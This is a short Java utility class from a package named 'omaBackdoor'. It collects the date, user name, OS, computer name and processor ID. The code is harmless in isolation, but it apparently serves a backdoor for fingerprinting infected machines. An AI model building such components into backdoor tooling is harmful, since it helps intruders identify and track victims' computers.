package me.oma.omaBackdoor.util;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class SystemUtil
{
    public String getDate()
    {
        DateTimeFormatter dtf = DateTimeFormatter.ofPattern("HH:mm:ss MM/dd/yyyy");
        LocalDateTime now = LocalDateTime.now();

        return(dtf.format(now));
    }

    public String getName()
    {
        return System.getProperty("user.name");
    }

    public String getOS()
    {
        return System.getProperty("os.name");
    }

    public String getPCName()
    {
        return System.getenv("COMPUTERNAME");
    }

    public String getProcessorID()
    {
        return System.getenv("PROCESSOR_IDENTIFIER");
    }
}
